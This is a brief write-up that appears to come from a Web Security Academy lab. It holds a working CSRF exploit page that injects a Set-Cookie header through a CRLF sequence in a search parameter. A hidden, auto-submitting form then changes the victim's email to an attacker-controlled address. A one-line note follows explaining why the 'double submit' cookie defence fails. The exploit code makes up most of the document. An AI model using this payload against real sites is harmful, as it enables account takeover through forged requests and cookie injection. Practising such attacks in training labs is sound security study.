```
<html>
    <body>
        <img src="https://0a92009704dc6bbd8253102a008c0096.web-security-academy.net?search=test%0d%0aSet-Cookie:csrf=whatever%3b%20SameSite=None" />
        <form action="https://0a92009704dc6bbd8253102a008c0096.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned123@evil-user.net" />
            <input type="hidden" name="csrf" value="whatever">
        </form>
        <script>
            setTimeout(() => {
                document.forms[0].submit();
            }, 1000)
        </script>
    </body>
</html>
```

## Double submit

As long as csrf token in Cookie and request body is the same, then pass. 

Prerequisite: session set functionality